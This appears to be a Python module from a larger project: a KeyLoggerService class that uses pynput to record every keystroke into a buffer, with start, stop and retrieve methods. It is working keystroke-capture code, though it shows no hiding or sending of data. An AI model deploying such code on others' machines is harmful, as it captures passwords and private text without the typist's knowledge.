from pynput import keyboard
from typing import List
from threading import Thread
from interface import IKeyLogger

class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.buffer = []
        self.listener = None
        self.is_listening = False

    def _on_press(self, key):
        try:
            self.buffer.append(key.char)
        except AttributeError:
            self.buffer.append(f"[{key.name}]")

    def logging_start(self):
        if not self.is_listening:
            self.listener = keyboard.Listener(on_press=self._on_press)
            self.listener.start()
            self.is_listening = True

    def logging_stop(self):
        if self.listener and self.is_listening:
            self.listener.stop()
            self.is_listening = False

    def keys_logged_get(self) -> List[str]:
        keys = self.buffer.copy()
        self.buffer.clear()
        return keys
